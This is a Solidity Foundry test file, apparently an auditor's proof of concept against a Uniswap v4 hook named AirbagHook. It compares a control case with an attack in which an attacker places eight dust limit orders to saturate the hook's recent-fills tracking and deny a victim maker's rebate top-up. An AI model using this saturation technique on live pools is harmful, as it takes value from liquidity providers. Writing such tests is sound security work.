// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test, console2} from "forge-std/Test.sol";
import {Deployers} from "@uniswap/v4-core/test/utils/Deployers.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {Hooks} from "@uniswap/v4-core/src/libraries/Hooks.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {SwapParams, ModifyLiquidityParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";
import {HookMiner} from "v4-periphery/test/shared/HookMiner.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {AirbagHook} from "../src/AirbagHook.sol";
import {AirbagOrders} from "../src/AirbagOrders.sol";

contract ZzSaturationPoc is Test, Deployers {
    using StateLibrary for IPoolManager;

    AirbagHook internal hook;
    address internal maker = address(0xA11CE);
    address internal attacker = address(0xBAD);

    function setUp() public {
        deployFreshManagerAndRouters();
        (currency0, currency1) = deployMintAndApprove2Currencies();

        uint160 flags =
            uint160(Hooks.BEFORE_SWAP_FLAG | Hooks.AFTER_SWAP_FLAG | Hooks.AFTER_SWAP_RETURNS_DELTA_FLAG);
        (address predicted, bytes32 salt) =
            HookMiner.find(address(this), flags, type(AirbagHook).creationCode, abi.encode(address(manager)));
        hook = new AirbagHook{salt: salt}(manager);
        assertEq(address(hook), predicted);

        (key,) = initPoolAndAddLiquidity(currency0, currency1, IHooks(address(hook)), 500, SQRT_PRICE_1_1);
        modifyLiquidityRouter.modifyLiquidity(
            key,
            ModifyLiquidityParams({tickLower: -30000, tickUpper: 30000, liquidityDelta: 10_000e18, salt: bytes32(0)}),
            ""
        );

        deal(Currency.unwrap(currency0), address(this), 1e30);
        deal(Currency.unwrap(currency1), address(this), 1e30);
        for (uint256 i; i < 2; ++i) {
            address who = i == 0 ? maker : attacker;
            deal(Currency.unwrap(currency0), who, 1e28);
            deal(Currency.unwrap(currency1), who, 1e28);
            vm.startPrank(who);
            IERC20(Currency.unwrap(currency0)).approve(address(hook), type(uint256).max);
            IERC20(Currency.unwrap(currency1)).approve(address(hook), type(uint256).max);
            vm.stopPrank();
        }
    }

    function _pushTo(int24 target) internal {
        (, int24 cur,,) = manager.getSlot0(key.toId());
        if (target == cur) return;
        bool up = target > cur;
        swapRouter.swap(
            key,
            SwapParams({zeroForOne: !up, amountSpecified: -1e24, sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(target)}),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
    }

    function _rebate(uint256 id) internal view returns (uint256) {
        AirbagOrders.Order memory o = hook.orderOf(id);
        return uint256(o.rebate0) + o.rebate1;
    }

    function _victim() internal returns (uint256 id) {
        uint128 liq = manager.getLiquidity(key.toId()) / 500;
        vm.prank(maker);
        id = hook.createOrder(key, 100, liq); // occupies [100, 110]
    }

    /// CONTROL: no saturation. swap1 -> 90, swap2 -> 100 (fills victim, disp 0),
    /// swap3 -> 300 (top-up must land)
    function test_control_topUpLands() public {
        uint256 v = _victim();
        _pushTo(95);
        _pushTo(114);
        (, int24 tk,,) = manager.getSlot0(key.toId());
        console2.log("tick after swap2", tk);
        assertTrue(hook.orderOf(v).filled, "victim filled by swap2");
        assertEq(_rebate(v), 0, "no charge at fill time (disp 0)");
        uint256 b=IERC20(Currency.unwrap(currency0)).balanceOf(address(this));
        _pushTo(300);
        console2.log("CONTROL swapper out0", IERC20(Currency.unwrap(currency0)).balanceOf(address(this))-b);
        console2.log("CONTROL rebate after swap3", _rebate(v));
        assertGt(_rebate(v), 0, "control: top-up lands");
    }

    /// ATTACK: 8 dust orders on the spacings between spot and the victim saturate RecentFills
    function test_attack_saturateRecentFills() public {
        uint256 v = _victim();
        for (int24 t = 10; t <= 80; t += 10) {
            vm.prank(attacker);
            hook.createOrder(key, t, 1); // liquidity-1 dust
        }
        _pushTo(95); // fills all 8 dust orders -> rf.count == 8
        _pushTo(114); // fills victim, displacement <= fee
        (, int24 tk,,) = manager.getSlot0(key.toId());
        console2.log("tick after swap2", tk);
        AirbagOrders.Order memory o = hook.orderOf(v);
        assertTrue(o.filled, "victim filled by swap2");
        assertEq(uint256(o.rebate0) + o.rebate1, 0, "no charge at fill time");
        uint256 b=IERC20(Currency.unwrap(currency0)).balanceOf(address(this));
        _pushTo(300); // would normally top up
        console2.log("ATTACK swapper out0", IERC20(Currency.unwrap(currency0)).balanceOf(address(this))-b);
        console2.log("ATTACK rebate after swap3", _rebate(v));
        console2.log("ATTACK paidDisplacement", hook.orderOf(v).paidDisplacement);
    }
}
